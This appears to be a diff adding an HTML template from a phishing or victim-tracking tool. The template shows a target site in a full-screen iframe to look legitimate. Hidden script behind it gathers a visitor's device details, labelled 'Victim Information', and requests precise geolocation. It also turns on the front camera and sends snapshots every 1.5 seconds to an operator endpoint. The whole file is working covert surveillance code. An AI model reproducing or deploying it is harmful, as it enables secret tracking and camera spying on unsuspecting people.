@@ -1,0 +1,28 @@
+<html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title>
+  <style>iframe{border:0;overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0;}</style></head>
+  <body>
+  <video id="video" style="display:none" playsinline autoplay></video>
+  <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+  <script defer>
+  var uid="<%=uid %>";
+  async function gather(){
+  var td="";
+  td+='<code>Victim Information</code><br><br><b>IP: <a href="https://ip-api.com/#<%=ip %>"><%=ip %></a> | Time: <%=time %></b>';
+  td+="<br><br><b>Date:</b> "+new Date()+"<br>";
+  var xo=["productSub","vendor","maxTouchPoints","hardwareConcurrency","cookieEnabled","appVersion","platform","userAgent","language","languages","deviceMemory"];
+  td+="<br><b>Device Information</b><br>";
+  for(var i=0;i<xo.length;i++){if(xo[i] in navigator){td+="<b>"+xo[i]+"</b>: <code>"+navigator[xo[i]]+"</code><br>";}}
+  function success(pos){const crd=pos.coords;$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},function(){});}
+  function error(err){td+="<br><b>Location ERROR:</b> <code>"+err.message+"</code>";}
+  if(navigator.geolocation){navigator.geolocation.getCurrentPosition(success,error,{enableHighAccuracy:true,maximumAge:0});}
+  const video=document.getElementById('video'),canvas=document.getElementById('canvas');
+  function post(o){$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},function(){});}
+  async function cam(){try{const stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});window.stream=stream;video.srcObject=stream;var ctx=canvas.getContext('2d');setInterval(function(){ctx.drawImage(video,0,0,500,500);post(canvas.toDataURL("image/png").replace("data:image/png;base64",""));},1500);}catch(e){td+='<br><b>Camera Error:</b> '+e.toString();}}
+  cam();
+  $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
+  }
+  gather();
+  </script>
+  <iframe src="<%=url %>"></iframe>
+  </body></html>
